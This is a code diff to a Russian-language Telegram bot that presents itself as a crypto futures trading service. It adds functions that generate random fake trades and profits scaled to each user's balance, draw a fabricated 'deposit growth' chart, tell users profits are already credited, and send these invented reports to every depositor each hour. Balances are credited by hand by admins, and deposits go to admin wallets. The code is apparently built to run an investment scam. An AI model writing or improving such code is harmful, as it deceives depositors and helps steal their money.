@@ -3,7 +3,13 @@ import logging
 import os
 import re
 import random
+import io
 from datetime import datetime
+
+# Импорты для графика
+import matplotlib
+matplotlib.use('Agg') # Обязательно для работы на сервере без экрана
+import matplotlib.pyplot as plt
 
 import aiosqlite
 from dotenv import load_dotenv
@@ -14,7 +20,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (
-    Message, CallbackQuery,
+    Message, CallbackQuery, BufferedInputFile,
     InlineKeyboardMarkup, InlineKeyboardButton,
 )
 from aiogram.client.default import DefaultBotProperties
@@ -207,12 +213,74 @@ async def finish_withdrawal(wid: int, status: str):
         await db.commit()
 
 
+# ==================== ГЕНЕРАТОР СДЕЛОК И ГРАФИКА ====================
+def generate_trades(balance: int):
+    if balance <= 0:
+        return "", 0.0
+        
+    num_trades = random.randint(3, 7)
+    trades_text = ""
+    total_profit = 0.0
+    
+    coins = ["BTC/USDT", "ETH/USDT", "SOL/USDT", "BNB/USDT", "XRP/USDT", "DOGE/USDT"]
+    directions = ["Long 🟢", "Short 🔴"]
+    
+    for i in range(1, num_trades + 1):
+        percent = random.uniform(0.003, 0.028)
+        profit = round(balance * percent, 2)
+        total_profit += profit
+        
+        coin = random.choice(coins)
+        direction = random.choice(directions)
+        
+        trades_text += f"🔹 {coin} | {direction}: <b>+${profit}</b>\n"
+        
+    return trades_text, round(total_profit, 2)
+
+
+def create_chart_image(balance: int):
+    """Генерирует красивый график роста депозита"""
+    # Настройка темной темы
+    plt.style.use('dark_background')
+    fig, ax = plt.subplots(figsize=(6, 4))
+    
+    # Генерируем точки графика (общий тренд вверх + небольшие колебания)
+    steps = 20
+    x = list(range(steps))
+    y = [balance]
+    
+    for _ in range(steps - 1):
+        # Небольшой рост или падение (в среднем идет вверх)
+        change = random.uniform(-0.01, 0.03) * balance
+        y.append(y[-1] + change)
+        
+    # Отрисовка линии
+    ax.plot(x, y, color='#00FF00', linewidth=2, marker='o', markersize=3)
+    ax.fill_between(x, y, color='#00FF00', alpha=0.1)
+    
+    # Убираем лишние оси для красоты
+    ax.set_title("Рост вашего депозита", color='white')
+    ax.grid(True, linestyle='--', alpha=0.3)
+    ax.set_xticks([]) # Убираем цифры оси X
+    
+    # Сохраняем в буфер
+    buf = io.BytesIO()
+    plt.savefig(buf, format='png', bbox_inches='tight', transparent=True)
+    buf.seek(0)
+    plt.close(fig)
+    return buf
+
+
 # ==================== KEYBOARDS ====================
 def client_menu_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="👤 Профиль", callback_data="client:profile"),
-            InlineKeyboardButton(text="💬 Поддержка", callback_data="client:support"),
+            InlineKeyboardButton(text="📈 Статистика", callback_data="client:stats"),
+        ],
+        [
+            InlineKeyboardButton(text="📉 График", callback_data="client:chart"),
+            InlineKeyboardButton(text="💬 Поддержка", callback_data="client:support")
         ],
         [
             InlineKeyboardButton(text="💵 Пополнение", callback_data="client:deposit"),
@@ -233,12 +301,11 @@ def admin_menu_kb() -> InlineKeyboardMarkup:
         ],
         [
             InlineKeyboardButton(text="📢 Рассылка", callback_data="admin:broadcast"),
-            InlineKeyboardButton(text="📈 Отчет вручную", callback_data="admin:trading"),
+            InlineKeyboardButton(text="📈 Отчет всем", callback_data="admin:trading"),
         ]
     ])
 
 
-# Кнопки "Назад" для всех меню
 def back_to_admin_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="⬅️ В админ-меню", callback_data="admin:menu")]
@@ -249,16 +316,9 @@ def back_to_client_kb() -> InlineKeyboardMarkup:
         [InlineKeyboardButton(text="⬅️ В меню", callback_data="client:menu")]
     ])
 
-def back_to_clients_list_kb() -> InlineKeyboardMarkup:
+def cancel_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ К клиентам", callback_data="admin:users:0")],
-        [InlineKeyboardButton(text="⬅️ В админ-меню", callback_data="admin:menu")]
-    ])
-
-def back_to_wallets_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ К кошелькам", callback_data="admin:wallets")],
-        [InlineKeyboardButton(text="⬅️ В админ-меню", callback_data="admin:menu")]
+        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_action")]
     ])
 
 
@@ -302,7 +362,7 @@ def admin_wallets_kb(wallets: list[dict]) -> InlineKeyboardMarkup:
             text=f"❌ {w['network']}: {w['address'][:18]}…",
             callback_data=f"admin:wallet:del:{w['id']}",
         )])
-    buttons.append([InlineKeyboardButton(text="➕ Добавить кошелёк", callback_data="admin:wallet:add")])
+    buttons.append([InlineKeyboardButton(text="➕ Добавить кошелек", callback_data="admin:wallet:add")])
     buttons.append([InlineKeyboardButton(text="⬅️ В админ-меню", callback_data="admin:menu")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -361,6 +421,18 @@ admin_router.callback_query.filter(F.from_user.id.in_(ADMIN_IDS))
 client_router = Router()
 
 
+# ==================== ОТМЕНА ДЕЙСТВИЙ ====================
+@admin_router.callback_query(F.data == "cancel_action")
+@client_router.callback_query(F.data == "cancel_action")
+async def cancel_action_cb(call: CallbackQuery, state: FSMContext):
+    await state.clear()
+    await call.message.delete()
+    if is_admin(call.from_user.id):
+        await call.message.answer("Действие отменено.", reply_markup=admin_menu_kb())
+    else:
+        await call.message.answer("Действие отменено.", reply_markup=client_menu_kb())
+
+
 # ==================== РЕГИСТРАЦИЯ ====================
 @common_router.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
@@ -387,7 +459,7 @@ async def cmd_start(message: Message, state: FSMContext):
 
 
 @common_router.message(Registration.waiting_login)
-async def reg_set_login(message: Message, state: FSMContext):
+async def reg_set_login(message: Message, state: FSMContext, bot: Bot):
     login = (message.text or "").strip()
     if not LOGIN_RE.match(login):
         await message.answer("❌ Логин должен быть 3–20 символов: латиница, цифры, <code>_</code>.\nПопробуй ещё раз:")
@@ -398,7 +470,22 @@ async def reg_set_login(message: Message, state: FSMContext):
 
     await upsert_user(message.from_user.id, message.from_user.username, message.from_user.full_name, login=login)
     await state.clear()
+    
     await message.answer(f"✅ Готово! Твой логин: <code>{login}</code>\n💵 Баланс: <b>$0</b>\n\nМеню:", reply_markup=client_menu_kb())
+    
+    # 6. УВЕДОМЛЕНИЕ АДМИНУ О НОВОМ КЛИЕНТЕ
+    admin_text = (
+        f"🆕 <b>Новый клиент!</b>\n\n"
+        f"👤 Имя: {message.from_user.full_name}\n"
+        f"🔑 Логин: <code>{login}</code>\n"
+        f"🆔 ID: <code>{message.from_user.id}</code>"
+    )
+    for admin_id in ADMIN_IDS:
+        try:
+            await bot.send_message(admin_id, admin_text)
+        except Exception:
+            pass
+
     if is_admin(message.from_user.id):
         await message.answer("🔑 Открой /admin")
 
@@ -414,13 +501,67 @@ async def show_profile(call: CallbackQuery):
     await call.message.edit_text(text, reply_markup=back_to_client_kb())
 
 
+@client_router.callback_query(F.data == "client:stats")
+async def show_client_stats(call: CallbackQuery):
+    user = await get_user(call.from_user.id)
+    if not user: return
+        
+    balance = user["crystals"]
+    if balance <= 0:
+        await call.message.edit_text(
+            "📈 <b>Статистика</b>\n\nУ вас пока нет активного депозита для торговли. Пополните баланс.",
+            reply_markup=back_to_client_kb()
+        )
+        return
+        
+    trades_text, total_profit = generate_trades(balance)
+    now = datetime.now().strftime("%d.%m.%Y | %H:%M")
+    
+    text = (
+        f"📈 <b>Статистика торговли</b>\n"
+        f"<i>Обновлено: {now}</i>\n\n"
+        f"Результаты последней сессии (депозит <b>${balance}</b>):\n\n"
+        f"{trades_text}\n"
+        f"💰 <b>Чистая прибыль: +${total_profit}</b>\n\n"
+        f"<i>Все средства уже добавлены в ваш общий баланс.</i>"
+    )
+    await call.message.edit_text(text, reply_markup=back_to_client_kb())
+
+
+# 5. ГРАФИК ТОРГОВЛИ
+@client_router.callback_query(F.data == "client:chart")
+async def show_client_chart(call: CallbackQuery, bot: Bot):
+    user = await get_user(call.from_user.id)
+    if not user or user["crystals"] <= 0:
+        await call.answer("❌ Пополните баланс, чтобы увидеть график!", show_alert=True)
+        return
+
+    await call.message.edit_text("⏳ Генерируем ваш график...")
+    
+    # Генерируем картинку
+    chart_buf = create_chart_image(user["crystals"])
+    photo = BufferedInputFile(chart_buf.read(), filename="chart.png")
+    
+    # Отправляем картинку с текстом
+    caption = f"📉 <b>График доходности</b>\n\nВаш текущий баланс: <b>${user['crystals']}</b>\nНаш бот успешно торгует 24/7."
+    
+    await call.message.delete() # Удаляем сообщение "Генерируем..."
+    await bot.send_photo(
+        chat_id=call.from_user.id,
+        photo=photo,
+        caption=caption,
+        reply_markup=back_to_client_kb()
+    )
+
+
 @client_router.callback_query(F.data == "client:support")
 async def show_support(call: CallbackQuery):
     await call.message.edit_text("💬 <b>Поддержка</b>\n\nНапиши нам: @tradingbot2027", reply_markup=back_to_client_kb())
 
 
 @client_router.callback_query(F.data == "client:menu")
-async def back_to_client_menu(call: CallbackQuery):
+async def back_to_client_menu(call: CallbackQuery, state: FSMContext):
+    await state.clear()
     await call.message.edit_text("Выбери действие:", reply_markup=client_menu_kb())
 
 
@@ -447,10 +588,7 @@ async def show_deposit(call: CallbackQuery):
 @client_router.callback_query(F.data == "client:withdraw")
 async def withdraw_start(call: CallbackQuery, state: FSMContext):
     user = await get_user(call.from_user.id)
-    if not user or not user.get("login"):
-        await call.answer("Сначала пройди /start", show_alert=True)
-        return
-    if user["crystals"] <= 0:
+    if not user or user["crystals"] <= 0:
         await call.answer("❌ Нечего выводить — баланс $0", show_alert=True)
         return
 
@@ -468,21 +606,27 @@ async def withdraw_set_network(call: CallbackQuery, state: FSMContext):
     network = call.data.split(":", 2)[2]
     await state.update_data(network=network)
     await state.set_state(Withdraw.waiting_wallet)
-    await call.message.edit_text(f"📤 <b>Вывод</b>\nСеть: <b>{network}</b>\n\nВведи <b>адрес своего кошелька</b>:\n\n/cancel — отмена")
+    await call.message.edit_text(
+        f"📤 <b>Вывод</b>\nСеть: <b>{network}</b>\n\nВведи <b>адрес своего кошелька</b>:", 
+        reply_markup=cancel_kb()
+    )
 
 
 @client_router.message(Withdraw.waiting_wallet)
 async def withdraw_set_wallet(message: Message, state: FSMContext):
     wallet = (message.text or "").strip()
     if len(wallet) < 10 or len(wallet) > 200:
-        await message.answer("❌ Похоже на неправильный адрес. Попробуй снова:")
+        await message.answer("❌ Похоже на неправильный адрес. Попробуй снова:", reply_markup=cancel_kb())
         return
 
     data = await state.get_data()
     user = await get_user(message.from_user.id)
     await state.update_data(wallet=wallet)
     await state.set_state(Withdraw.waiting_amount)
-    await message.answer(f"📤 <b>Вывод</b>\nСеть: <b>{data['network']}</b>\nКошелёк: <code>{wallet}</code>\n\nСколько $ вывести? (доступно: <b>${user['crystals']}</b>)")
+    await message.answer(
+        f"📤 <b>Вывод</b>\nСеть: <b>{data['network']}</b>\nКошелёк: <code>{wallet}</code>\n\nСколько $ вывести? (доступно: <b>${user['crystals']}</b>)",
+        reply_markup=cancel_kb()
+    )
 
 
 @client_router.message(Withdraw.waiting_amount)
@@ -490,12 +634,12 @@ async def withdraw_set_amount(message: Message, state: FSMContext):
     try:
         amount = int((message.text or "").strip())
     except ValueError:
-        await message.answer("❌ Нужно целое число. Попробуй снова:")
+        await message.answer("❌ Нужно целое число. Попробуй снова:", reply_markup=cancel_kb())
         return
 
     user = await get_user(message.from_user.id)
     if amount <= 0 or amount > user["crystals"]:
-        await message.answer(f"❌ Неверная сумма. У тебя: ${user['crystals']}")
+        await message.answer(f"❌ Неверная сумма. У тебя: ${user['crystals']}", reply_markup=cancel_kb())
         return
 
     data = await state.get_data()
@@ -505,15 +649,9 @@ async def withdraw_set_amount(message: Message, state: FSMContext):
         f"Проверь заявку:\n\n🌐 Сеть: <b>{data['network']}</b>\n👛 Кошелёк: <code>{data['wallet']}</code>\n💵 Сумма: <b>${amount}</b>\n\nОтправить админу?",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="✅ Отправить", callback_data="wd:submit")],
-            [InlineKeyboardButton(text="❌ Отмена",   callback_data="wd:cancel")],
+            [InlineKeyboardButton(text="❌ Отмена",   callback_data="cancel_action")],
         ]),
     )
-
-
-@client_router.callback_query(F.data == "wd:cancel", Withdraw.confirm)
-async def withdraw_cancel(call: CallbackQuery, state: FSMContext):
-    await state.clear()
-    await call.message.edit_text("Отменено.", reply_markup=client_menu_kb())
 
 
 @client_router.callback_query(F.data == "wd:submit", Withdraw.confirm)
@@ -526,7 +664,7 @@ async def withdraw_submit(call: CallbackQuery, state: FSMContext, bot: Bot):
 
     text = (
         f"📤 <b>Новая заявка на вывод #{wid}</b>\n\n"
-        f"👤 Клиент: <code>{user['login']}</code> (id <code>{user['tg_id']}</code>)\n"
+        f"👤 Клиент: <code>{user['login']}</code>\n"
         f"🌐 Сеть: <b>{data['network']}</b>\n"
         f"👛 Кошелёк: <code>{data['wallet']}</code>\n"
         f"💵 Сумма: <b>${data['amount']}</b>"
@@ -547,7 +685,8 @@ async def admin_panel(message: Message):
 
 
 @admin_router.callback_query(F.data == "admin:menu")
-async def admin_menu_cb(call: CallbackQuery):
+async def admin_menu_cb(call: CallbackQuery, state: FSMContext):
+    await state.clear()
     await call.message.edit_text("🛠 <b>Админ-панель</b>", reply_markup=admin_menu_kb())
 
 
@@ -584,13 +723,11 @@ async def admin_user_card(call: CallbackQuery):
 async def credit_start(call: CallbackQuery, state: FSMContext):
     tg_id = int(call.data.split(":")[2])
     user = await get_user(tg_id)
-    if not user:
-        await call.answer("Клиент не найден", show_alert=True)
-        return
     await state.update_data(target_tg_id=tg_id, target_login=user["login"])
     await state.set_state(CreditCrystals.waiting_amount)
     await call.message.edit_text(
-        f"💵 <b>Начисление средств</b>\nКлиент: <code>{user['login']}</code>\n\nСколько начислить? Введи <b>целое число</b>.\nМожно отрицательное — тогда спишется.\n\n/cancel — отмена"
+        f"💵 <b>Начисление средств</b>\nКлиент: <code>{user['login']}</code>\n\nСколько начислить? Введи <b>целое число</b>.\nМожно отрицательное.",
+        reply_markup=cancel_kb()
     )
 
 
@@ -598,23 +735,21 @@ async def credit_start(call: CallbackQuery, state: FSMContext):
 async def credit_amount(message: Message, state: FSMContext):
     try:
         amount = int((message.text or "").strip())
+        if amount == 0: raise ValueError
     except ValueError:
-        await message.answer("❌ Нужно целое число. Попробуй снова:")
-        return
-    if amount == 0:
-        await message.answer("❌ 0 не подходит. Введи другое число:")
+        await message.answer("❌ Нужно целое число (не 0). Попробуй снова:", reply_markup=cancel_kb())
         return
 
     await state.update_data(amount=amount)
     await state.set_state(CreditCrystals.waiting_notification)
-    await message.answer(f"✍️ Введи текст уведомления, которое получит клиент.\nСумма: <b>${amount:+d}</b>\n\n/cancel — отмена")
+    await message.answer(f"✍️ Введи текст уведомления для клиента.\nСумма: <b>${amount:+d}</b>", reply_markup=cancel_kb())
 
 
 @admin_router.message(CreditCrystals.waiting_notification)
 async def credit_notification(message: Message, state: FSMContext):
     notification = (message.text or "").strip()
     if not notification:
-        await message.answer("❌ Пустое сообщение. Введи текст:")
+        await message.answer("❌ Пустое сообщение. Введи текст:", reply_markup=cancel_kb())
         return
 
     data = await state.get_data()
@@ -624,15 +759,9 @@ async def credit_notification(message: Message, state: FSMContext):
         f"Проверь:\n\n👤 Клиент: <code>{data['target_login']}</code>\n💵 Сумма: <b>${data['amount']:+d}</b>\n📝 Уведомление:\n{notification}\n\nПодтвердить?",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="✅ Начислить", callback_data="credit:go")],
-            [InlineKeyboardButton(text="❌ Отмена",    callback_data="credit:cancel")],
+            [InlineKeyboardButton(text="❌ Отмена",    callback_data="cancel_action")],
         ]),
     )
-
-
-@admin_router.callback_query(F.data == "credit:cancel", CreditCrystals.confirm)
-async def credit_cancel(call: CallbackQuery, state: FSMContext):
-    await state.clear()
-    await call.message.edit_text("Отменено.", reply_markup=back_to_admin_kb())
 
 
 @admin_router.callback_query(F.data == "credit:go", CreditCrystals.confirm)
@@ -667,8 +796,8 @@ async def credit_go(call: CallbackQuery, state: FSMContext, bot: Bot):
 async def broadcast_start(call: CallbackQuery, state: FSMContext):
     await state.set_state(Broadcast.waiting_message)
     await call.message.edit_text(
-        "📢 Отправь сообщение (текст) для рассылки.\nРассылка уйдет ТОЛЬКО клиентам с балансом больше $0.\nВ конец добавится актуальный баланс.\n\n/cancel — отмена",
-        reply_markup=back_to_admin_kb()
+        "📢 Отправь сообщение (текст) для рассылки.\nРассылка уйдет ТОЛЬКО клиентам с балансом > $0.",
+        reply_markup=cancel_kb()
     )
 
 
@@ -680,15 +809,9 @@ async def broadcast_preview(message: Message, state: FSMContext):
         f"✅ Отправить это сообщение всем активным клиентам?\n\nТекст:\n{message.text or message.caption}",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="✅ Отправить", callback_data="broadcast:go")],
-            [InlineKeyboardButton(text="❌ Отмена",    callback_data="broadcast:cancel")],
+            [InlineKeyboardButton(text="❌ Отмена",    callback_data="cancel_action")],
         ]),
     )
-
-
-@admin_router.callback_query(F.data == "broadcast:cancel", Broadcast.confirm)
-async def broadcast_cancel(call: CallbackQuery, state: FSMContext):
-    await state.clear()
-    await call.message.edit_text("Отменено.", reply_markup=back_to_admin_kb())
 
 
 @admin_router.callback_query(F.data == "broadcast:go", Broadcast.confirm)
@@ -724,9 +847,9 @@ async def trading_broadcast_start(call: CallbackQuery):
         return
     
     await call.message.edit_text(
-        f"📈 <b>Трейдинг-отчет (вручную)</b>\n\nБудет отправлен <b>{len(users)}</b> клиентам.\nБот рассчитает профит по стратегии скальпинга.\n\nЗапускаем?",
+        f"📈 <b>Трейдинг-отчет (вручную)</b>\n\nБудет отправлен <b>{len(users)}</b> клиентам с уникальными сделками.\n\nЗапускаем?",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="✅ Запустить рассылку", callback_data="trading:go")],
+            [InlineKeyboardButton(text="✅ Запустить", callback_data="trading:go")],
             [InlineKeyboardButton(text="⬅️ В админ-меню", callback_data="admin:menu")],
         ])
     )
@@ -734,26 +857,22 @@ async def trading_broadcast_start(call: CallbackQuery):
 
 @admin_router.callback_query(F.data == "trading:go")
 async def trading_broadcast_go(call: CallbackQuery, bot: Bot):
-    await call.message.edit_text("📤 Формируем и отправляем отчеты…")
+    await call.message.edit_text("📤 Формируем отчеты…")
     users = await get_users_with_balance()
     ok = fail = 0
     
     for u in users:
         bal = u['crystals']
-        trade1 = round(bal * 0.018, 2)
-        trade2 = round(bal * 0.022, 2)
-        trade3 = round(bal * 0.015, 2)
-        total_profit = round(trade1 + trade2 + trade3, 2)
+        trades_text, total_profit = generate_trades(bal)
+        now_time = datetime.now().strftime("%H:%M")
         
         text = (
-            f"🚀 <b>Наш торговый бот начал торговлю на фьючерсах!</b>\n\n"
-            f"Мы используем стратегию <b>скальпинга</b>.\n\n"
-            f"📊 <b>Статистика за сегодня по вашему депозиту (${bal}):</b>\n"
-            f"🔹 Сделка 1 (BTC/USDT Long): <b>+${trade1}</b>\n"
-            f"🔹 Сделка 2 (ETH/USDT Short): <b>+${trade2}</b>\n"
-            f"🔹 Сделка 3 (SOL/USDT Long): <b>+${trade3}</b>\n\n"
-            f"💰 <b>Итого заработано за день: +${total_profit}</b>\n\n"
-            f"💵 <b>Ваш текущий баланс:</b> <b>${bal}</b>"
+            f"🚀 <b>Отчет по торговле ({now_time})</b>\n\n"
+            f"Наш бот успешно отработал сессию на фьючерсах.\n\n"
+            f"📊 <b>Результаты по вашему депозиту (${bal}):</b>\n"
+            f"{trades_text}\n"
+            f"💰 <b>Итого профит: +${total_profit}</b>\n\n"
+            f"💵 <b>Ваш баланс:</b> <b>${bal}</b>"
         )
         try:
             await bot.send_message(u['tg_id'], text)
@@ -778,25 +897,25 @@ async def admin_wallets(call: CallbackQuery):
 @admin_router.callback_query(F.data == "admin:wallet:add")
 async def wallet_add_start(call: CallbackQuery, state: FSMContext):
     await state.set_state(AddWallet.waiting_network)
-    await call.message.edit_text("🌐 Введи название сети/валюты (например: <code>BTC</code>, <code>USDT (TRC20)</code>):\n\n/cancel — отмена", reply_markup=back_to_wallets_kb())
+    await call.message.edit_text("🌐 Введи название сети/валюты (например: <code>BTC</code>, <code>USDT (TRC20)</code>):", reply_markup=cancel_kb())
 
 
 @admin_router.message(AddWallet.waiting_network)
 async def wallet_add_network(message: Message, state: FSMContext):
     network = (message.text or "").strip()
     if not network or len(network) > 40:
-        await message.answer("❌ Название сети 1–40 символов:")
+        await message.answer("❌ Название сети 1–40 символов:", reply_markup=cancel_kb())
         return
     await state.update_data(network=network)
     await state.set_state(AddWallet.waiting_address)
-    await message.answer("👛 Теперь введи адрес кошелька:")
+    await message.answer("👛 Теперь введи адрес кошелька:", reply_markup=cancel_kb())
 
 
 @admin_router.message(AddWallet.waiting_address)
 async def wallet_add_address(message: Message, state: FSMContext):
     address = (message.text or "").strip()
     if not (10 <= len(address) <= 200):
-        await message.answer("❌ Странный адрес. Попробуй снова:")
+        await message.answer("❌ Странный адрес. Попробуй снова:", reply_markup=cancel_kb())
         return
     data = await state.get_data()
     await state.clear()
@@ -879,54 +998,14 @@ async def withdrawal_reject(call: CallbackQuery, bot: Bot):
     await call.message.edit_text(f"❌ Заявка #{wid} отклонена.", reply_markup=back_to_admin_kb())
 
 
-# -------- Отмена любого состояния --------
-@admin_router.message(Command("cancel"))
-async def cancel_any_admin(message: Message, state: FSMContext):
-    await state.clear()
-    await message.answer("Действие отменено.", reply_markup=admin_menu_kb())
-
-@client_router.message(Command("cancel"))
-async def cancel_any_client(message: Message, state: FSMContext):
-    await state.clear()
-    await message.answer("Действие отменено.", reply_markup=client_menu_kb())
-
-
-@client_router.message(Command("admin"))
-async def no_access(message: Message):
-    await message.answer("⛔ У тебя нет доступа к админ-панели.")
-
-
 # ==================== АВТО-РАССЫЛКА КАЖДЫЙ ЧАС ====================
 async def hourly_trading_loop(bot: Bot):
-    # Ждем 10 секунд при старте, чтобы бот успел прогрузиться
     await asyncio.sleep(10)
-    
     while True:
-        logging.info("Запуск ежечасной торговой статистики...")
         users = await get_users_with_balance()
-        
         for u in users:
             bal = u['crystals']
-            
-            # Генерируем случайные сделки (от 0.5% до 2.5%) для реалистичности
-            num_trades = random.randint(2, 4)
-            trades_text = ""
-            total_profit = 0.0
-            
-            coins = ["BTC/USDT", "ETH/USDT", "SOL/USDT", "BNB/USDT", "XRP/USDT"]
-            directions = ["Long", "Short"]
-            
-            for i in range(1, num_trades + 1):
-                percent = random.uniform(0.005, 0.025) # 0.5% - 2.5%
-                profit = round(bal * percent, 2)
-                total_profit += profit
-                
-                coin = random.choice(coins)
-                direction = random.choice(directions)
-                
-                trades_text += f"🔹 Сделка {i} ({coin} {direction}): <b>+${profit}</b> (+{round(percent*100, 1)}%)\n"
-            
-            total_profit = round(total_profit, 2)
+            trades_text, total_profit = generate_trades(bal)
             now_time = datetime.now().strftime("%H:%M")
             
             text = (
@@ -936,19 +1015,12 @@ async def hourly_trading_loop(bot: Bot):
                 f"{trades_text}\n"
                 f"💰 <b>Итого профит: +${total_profit}</b>\n\n"
                 f"💵 <b>Ваш баланс:</b> <b>${bal}</b>\n"
-                f"<i>(Средства уже учтены в вашем профиле)</i>"
             )
-            
             try:
                 await bot.send_message(u['tg_id'], text)
-            except Exception as e:
-                logging.error(f"Ошибка отправки hourly trade report {u['tg_id']}: {e}")
-            
-            await asyncio.sleep(0.1) # Задержка чтобы не забанили за флуд
-            
-        logging.info(f"Ежечасный отчет разослан {len(users)} клиентам.")
-        
-        # Спим 1 час (3600 секунд)
+            except Exception:
+                pass
+            await asyncio.sleep(0.1)
         await asyncio.sleep(3600)
 
 
@@ -964,7 +1036,6 @@ async def main():
     dp.include_router(admin_router)
     dp.include_router(client_router)
 
-    # Запускаем фоновую задачу для рассылки каждый час
     asyncio.create_task(hourly_trading_loop(bot))
 
     await bot.delete_webhook(drop_pending_updates=True)
